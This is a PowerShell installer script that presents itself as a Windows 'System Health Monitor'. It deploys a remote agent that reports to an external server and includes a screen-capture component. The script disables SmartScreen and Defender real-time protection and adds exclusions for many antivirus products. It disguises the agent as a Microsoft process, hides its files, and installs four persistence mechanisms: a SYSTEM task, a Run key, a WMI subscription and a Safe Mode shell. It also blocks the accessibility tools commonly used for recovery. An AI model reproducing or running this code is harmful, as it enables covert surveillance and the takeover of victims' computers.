<#
.SYNOPSIS
    H-Boss Agent Protection Installer (Win 10/11 Compatible)
    4-Layer Persistence: ScheduledTask + Registry + WMI + SafeMode
    Usage: Right-click -> Run with PowerShell (or use INSTALL.bat)
#>

param (
    [string]$ServerUrl = "https://h-boss-production.up.railway.app"
)

# ═══════════════════════════════════════════════════
# 0. SELF-ELEVATION
# ═══════════════════════════════════════════════════
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Requesting Administrator Privileges..." -ForegroundColor Yellow
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ServerUrl `"$ServerUrl`"" -Verb RunAs
    exit
}

$ErrorActionPreference = "SilentlyContinue"

# ═══════════════════════════════════════════════════
# 1. CONFIG
# ═══════════════════════════════════════════════════
$AgentSource = Join-Path $PSScriptRoot "teram_agent.exe"
$InstallDir  = "C:\ProgramData\Microsoft\Windows\SystemHealth"
$ExeName     = "RuntimeBroker_Sys.exe"
$DestPath    = Join-Path $InstallDir $ExeName
$TaskName    = "MicrosoftWindowsHealthMonitor"

Write-Host ""
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host "   SYSTEM HEALTH MONITOR - INSTALLER" -ForegroundColor Cyan
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host ""

# ═══════════════════════════════════════════════════
# 2. PRE-FLIGHT: SmartScreen & Defender bypass FIRST
# ═══════════════════════════════════════════════════
Write-Host "[1/9] Removing SmartScreen blocks..." -ForegroundColor Yellow

# Strip Zone.Identifier ADS (root cause of SmartScreen popups)
Get-ChildItem -Path $PSScriptRoot -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
    try { Remove-Item -Path "$($_.FullName):Zone.Identifier" -Force -ErrorAction SilentlyContinue } catch {}
}
Get-ChildItem -Path $PSScriptRoot -Recurse -ErrorAction SilentlyContinue | Unblock-File -ErrorAction SilentlyContinue

# Disable SmartScreen via registry
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f 2>$null | Out-Null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f 2>$null | Out-Null
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f 2>$null | Out-Null

Write-Host "[2/9] Configuring Defender + Third-Party AV exclusions..." -ForegroundColor Yellow

# --- Windows Defender (with 10s timeout — Tamper Protection may block these) ---
$defenderJob = Start-Job -ScriptBlock {
    param($dir, $root, $exe)
    try { Add-MpPreference -ExclusionPath $dir -ErrorAction Stop } catch {}
    try { Add-MpPreference -ExclusionPath $root -ErrorAction SilentlyContinue } catch {}
    try { Add-MpPreference -ExclusionProcess $exe -ErrorAction SilentlyContinue } catch {}
    try { Add-MpPreference -ExclusionProcess "teram_agent.exe" -ErrorAction SilentlyContinue } catch {}
    try { Add-MpPreference -ExclusionProcess "ScreenCap.exe" -ErrorAction SilentlyContinue } catch {}
    try { Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {}
    try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}
} -ArgumentList $InstallDir, $PSScriptRoot, $ExeName

if (-not (Wait-Job $defenderJob -Timeout 10)) {
    Stop-Job $defenderJob
    Write-Host "    Defender config timed out (Tamper Protection active). Skipping." -ForegroundColor DarkYellow
} else {
    Write-Host "    Defender exclusions applied." -ForegroundColor DarkGreen
}
Remove-Job $defenderJob -Force

# --- McAfee Endpoint Security ---
reg add "HKLM\SOFTWARE\McAfee\AVEngine\OAS\Exclusions\Paths" /v "$InstallDir" /t REG_SZ /d "1" /f 2>$null | Out-Null
reg add "HKLM\SOFTWARE\McAfee\AVEngine\OAS\Exclusions\Paths" /v "$PSScriptRoot" /t REG_SZ /d "1" /f 2>$null | Out-Null
reg add "HKLM\SOFTWARE\McAfee\VSCore\On Access Scanner\MCShield\Configuration\Default" /v ExcludedItem_1 /t REG_SZ /d "3|1|$InstallDir" /f 2>$null | Out-Null
Stop-Process -Name "mcshield" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "mfeavsvc" -Force -ErrorAction SilentlyContinue

# --- Avast / AVG ---
reg add "HKLM\SOFTWARE\AVAST Software\Avast\Exclusions\Path" /v "$InstallDir" /t REG_SZ /d "" /f 2>$null | Out-Null
reg add "HKLM\SOFTWARE\AVAST Software\Avast\Exclusions\Path" /v "$DestPath" /t REG_SZ /d "" /f 2>$null | Out-Null
reg add "HKLM\SOFTWARE\AVG\Antivirus\Exclusions\Path" /v "$InstallDir" /t REG_SZ /d "" /f 2>$null | Out-Null
reg add "HKLM\SOFTWARE\AVG\Antivirus\Exclusions\Path" /v "$DestPath" /t REG_SZ /d "" /f 2>$null | Out-Null

# --- Norton / Symantec ---
reg add "HKLM\SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\Directory" /v "$InstallDir" /t REG_SZ /d "" /f 2>$null | Out-Null

# --- Kaspersky ---
reg add "HKLM\SOFTWARE\KasperskyLab\AVP\Data\ExcludedPaths" /v "$InstallDir" /t REG_SZ /d "" /f 2>$null | Out-Null

# --- Bitdefender ---
reg add "HKLM\SOFTWARE\Bitdefender\Exclusions" /v "$InstallDir" /t REG_SZ /d "" /f 2>$null | Out-Null

# --- ESET ---
reg add "HKLM\SOFTWARE\ESET\ESET Security\RealTimeProtection\ExcludedPaths" /v "$InstallDir" /t REG_SZ /d "" /f 2>$null | Out-Null

# --- Trend Micro ---
reg add "HKLM\SOFTWARE\TrendMicro\PC-cillinNTCorp\CurrentVersion\Real Time Scan Configuration\ExcludedPaths" /v "$InstallDir" /t REG_SZ /d "" /f 2>$null | Out-Null

Write-Host "    All AV exclusions configured." -ForegroundColor DarkGreen

# ═══════════════════════════════════════════════════
# 3. CLEAN SLATE
# ═══════════════════════════════════════════════════
Write-Host "[3/9] Cleaning previous installation..." -ForegroundColor Yellow

# Kill processes
@("RuntimeBroker_Sys", "teram_agent", "ScreenCap", "wscript") | ForEach-Object {
    Stop-Process -Name $_ -Force -ErrorAction SilentlyContinue
    $procName = "$_.exe"
    cmd.exe /c "taskkill /F /IM `"$procName`" /T 2>nul" | Out-Null
}

# Remove old scheduled task
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
schtasks.exe /Delete /TN $TaskName /F 2>$null | Out-Null

# Remove old registry key
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /f 2>$null | Out-Null

# Clean old WMI subscriptions
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WinHealthFilter'" -EA 0 | Remove-WmiObject -EA 0
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WinHealthConsumer'" -EA 0 | Remove-WmiObject -EA 0
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -EA 0 | Where-Object { $_.Filter -like '*WinHealthFilter*' } | Remove-WmiObject -EA 0

Start-Sleep -Seconds 2

# ═══════════════════════════════════════════════════
# 4. INSTALL FILES
# ═══════════════════════════════════════════════════
Write-Host "[4/9] Installing to secure location..." -ForegroundColor Green

# *** CRITICAL FIX: Remove DENY ACEs FIRST, then grant permissions ***
# This is what was causing "Access is denied" on re-installs.
# The old stealth phase used /deny Everyone which blocks even Admins.
if (Test-Path $InstallDir) {
    cmd.exe /c "attrib -h -s `"$InstallDir`" /D /S 2>nul" | Out-Null
    cmd.exe /c "takeown.exe /F `"$InstallDir`" /R /A /D Y 2>nul" | Out-Null
    # *** THE KEY FIX: Remove explicit DENY entries before granting ***
    cmd.exe /c "icacls.exe `"$InstallDir`" /remove:d Everyone /T /C /Q 2>nul" | Out-Null
    cmd.exe /c "icacls.exe `"$InstallDir`" /remove:d Users /T /C /Q 2>nul" | Out-Null
    cmd.exe /c "icacls.exe `"$InstallDir`" /grant Administrators:F /T /C /Q 2>nul" | Out-Null
    cmd.exe /c "icacls.exe `"$InstallDir`" /reset /T /C /Q 2>nul" | Out-Null
}

if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
}

# Verify source exists
if (-not (Test-Path $AgentSource)) {
    Write-Host "`n[ERROR] teram_agent.exe not found!" -ForegroundColor Red
    Write-Host "Make sure it's in the same folder as this script." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Copy all files (use robocopy for reliability, falls back to Copy-Item)
$null = cmd.exe /c "robocopy `"$PSScriptRoot`" `"$InstallDir`" /E /IS /IT /NP /NFL /NDL /NJH /NJS 2>nul"
if ($LASTEXITCODE -ge 8) {
    # robocopy exit codes 0-7 are success/partial, 8+ are errors
    Write-Host "    Robocopy had issues, trying Copy-Item..." -ForegroundColor DarkYellow
    Copy-Item -Path "$PSScriptRoot\*" -Destination $InstallDir -Force -Recurse -ErrorAction SilentlyContinue
}

# Rename agent
if (Test-Path $DestPath) {
    cmd.exe /c "attrib -h -s `"$DestPath`" 2>nul" | Out-Null
    Remove-Item -Path $DestPath -Force -ErrorAction SilentlyContinue
}
Copy-Item -Path $AgentSource -Destination $DestPath -Force

# Force recompile ScreenCap — but ONLY if CSC compiler is available
$cscPath = @(
    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
    "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
) | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($cscPath) {
    Remove-Item -Path (Join-Path $InstallDir "ScreenCap.exe") -Force -ErrorAction SilentlyContinue
} else {
    Write-Host "    [!] CSC.exe not found — keeping existing ScreenCap.exe" -ForegroundColor DarkYellow
}

# Strip SmartScreen from installed files
Get-ChildItem -Path $InstallDir -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
    try { Remove-Item -Path "$($_.FullName):Zone.Identifier" -Force -ErrorAction SilentlyContinue } catch {}
}

# Firewall
netsh advfirewall firewall delete rule name="Windows System Health" 2>$null | Out-Null
netsh advfirewall firewall delete rule name="Windows System Health In" 2>$null | Out-Null
netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="$DestPath" enable=yes profile=any 2>$null | Out-Null
netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="$DestPath" enable=yes profile=any 2>$null | Out-Null

Write-Host "    Files installed successfully." -ForegroundColor DarkGreen

# ═══════════════════════════════════════════════════
# 5. PERSISTENCE LAYER 1: Scheduled Task (SYSTEM)
# ═══════════════════════════════════════════════════
Write-Host "[5/9] Layer 1: Scheduled Task (SYSTEM)..." -ForegroundColor Green

$Action  = New-ScheduledTaskAction -Execute $DestPath -Argument $ServerUrl -WorkingDirectory $InstallDir
$Trigger = @(
    (New-ScheduledTaskTrigger -AtStartup),
    (New-ScheduledTaskTrigger -AtLogOn)
)
$Settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RestartCount 9999 `
    -RestartInterval (New-TimeSpan -Minutes 1) `
    -ExecutionTimeLimit (New-TimeSpan -Days 365) `
    -MultipleInstances IgnoreNew

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -Force | Out-Null
Write-Host "    Task registered." -ForegroundColor DarkGreen

# ═══════════════════════════════════════════════════
# 6. PERSISTENCE LAYER 2: Registry Run Key
# ═══════════════════════════════════════════════════
Write-Host "[6/9] Layer 2: Registry Run Key..." -ForegroundColor Green

New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "WindowsHealthCheck" `
    -Value "`"$DestPath`" $ServerUrl" `
    -PropertyType String -Force | Out-Null

# ═══════════════════════════════════════════════════
# 7. PERSISTENCE LAYER 3: WMI Event Subscription
# ═══════════════════════════════════════════════════
Write-Host "[7/9] Layer 3: WMI Boot Subscription..." -ForegroundColor Green

try {
    $filterName = 'WinHealthFilter'
    $consumerName = 'WinHealthConsumer'
    
    $wqlQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    
    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name           = $filterName
        EventNamespace = 'root\cimv2'
        QueryLanguage  = 'WQL'
        Query          = $wqlQuery
    }
    
    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name                = $consumerName
        CommandLineTemplate = "`"$DestPath`" $ServerUrl"
        RunInteractively    = $false
    }
    
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter   = $filter
        Consumer = $consumer
    } | Out-Null
    
    Write-Host "    WMI subscription created." -ForegroundColor DarkGreen
} catch {
    Write-Host "    WMI setup skipped (may need rerun)." -ForegroundColor DarkYellow
}

# ═══════════════════════════════════════════════════
# 8. PERSISTENCE LAYER 4: Safe Mode
# ═══════════════════════════════════════════════════
Write-Host "[8/9] Layer 4: Safe Mode persistence..." -ForegroundColor Green

reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v AlternateShell /d "cmd.exe /c start `"`" `"$DestPath`" $ServerUrl & cmd.exe" /f 2>$null | Out-Null
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\$TaskName" /ve /d "Service" /f 2>$null | Out-Null
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\$TaskName" /ve /d "Service" /f 2>$null | Out-Null

# Block accessibility exploits
@("sethc.exe", "utilman.exe", "osk.exe", "Magnify.exe", "Narrator.exe") | ForEach-Object {
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$_" /v Debugger /t REG_SZ /d "systray.exe" /f 2>$null | Out-Null
}

# ═══════════════════════════════════════════════════
# 9. STEALTH + LAUNCH
# ═══════════════════════════════════════════════════
Write-Host "[9/9] Stealth & Launch..." -ForegroundColor Green

# *** FIX: Use inheritance removal + explicit grants ONLY ***
# DO NOT use /deny — it breaks re-installs on Win 10/11
icacls.exe $InstallDir /inheritance:r /grant "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F" "BUILTIN\Users:(OI)(CI)RX" /T /C /Q 2>$null | Out-Null

# Hide
attrib +h $InstallDir /D 2>$null | Out-Null
attrib +h $DestPath 2>$null | Out-Null

# Start via scheduled task (runs as SYSTEM)
schtasks.exe /Run /TN $TaskName 2>$null | Out-Null

# RETRY LOOP: AV may kill the process on first attempt
# Try up to 3 methods with delays for AV scan to complete
$running = $null
for ($attempt = 1; $attempt -le 3; $attempt++) {
    Start-Sleep -Seconds 5
    $running = Get-Process -Name "RuntimeBroker_Sys" -ErrorAction SilentlyContinue
    if ($running) { break }

    Write-Host "    [Attempt $attempt/3] Process not detected. Retrying..." -ForegroundColor DarkYellow
    
    switch ($attempt) {
        2 {
            # Method 2: Direct start as current user
            Start-Process -FilePath $DestPath -ArgumentList $ServerUrl -WorkingDirectory $InstallDir -WindowStyle Hidden
        }
        3 {
            # Method 3: cmd.exe wrapper (sometimes bypasses AV behavior detection)
            cmd.exe /c "start /B `"`" `"$DestPath`" $ServerUrl" 2>$null
        }
    }
}

Write-Host ""
if ($running) {
    Write-Host "=====================================================" -ForegroundColor Green
    Write-Host "   DEPLOYMENT SUCCESSFUL" -ForegroundColor Green
    Write-Host "=====================================================" -ForegroundColor Green
    Write-Host "   Process:  $ExeName [RUNNING]" -ForegroundColor Cyan
    Write-Host "   Server:   $ServerUrl" -ForegroundColor Cyan
    Write-Host "   Location: $InstallDir" -ForegroundColor Cyan
    Write-Host "" 
    Write-Host "   PERSISTENCE LAYERS:" -ForegroundColor DarkGray
    Write-Host "     1. Scheduled Task  (SYSTEM)" -ForegroundColor DarkGray
    Write-Host "     2. Registry RunKey (HKLM)" -ForegroundColor DarkGray
    Write-Host "     3. WMI Subscription" -ForegroundColor DarkGray
    Write-Host "     4. Safe Mode" -ForegroundColor DarkGray
    Write-Host "=====================================================" 
} else {
    Write-Host "=====================================================" -ForegroundColor Yellow
    Write-Host "   INSTALLED - WILL AUTO-START ON REBOOT" -ForegroundColor Yellow
    Write-Host "=====================================================" -ForegroundColor Yellow
    Write-Host "   Your antivirus may have blocked the first run." -ForegroundColor Yellow
    Write-Host "" 
    Write-Host "   WHAT TO DO:" -ForegroundColor Yellow
    Write-Host "     1. Check your AV quarantine and restore the file" -ForegroundColor Yellow
    Write-Host "     2. Add exclusion for: $InstallDir" -ForegroundColor Yellow
    Write-Host "     3. Reboot - it will auto-start on next boot" -ForegroundColor Yellow
    Write-Host "" 
    Write-Host "   Manual test: $DestPath $ServerUrl" -ForegroundColor Yellow
    Write-Host "=====================================================" 
}

Write-Host ""
Write-Host "You can safely delete this installer folder now." -ForegroundColor DarkGray
Write-Host "The agent is installed to: $InstallDir" -ForegroundColor DarkGray
Read-Host "Press Enter to exit"
exit

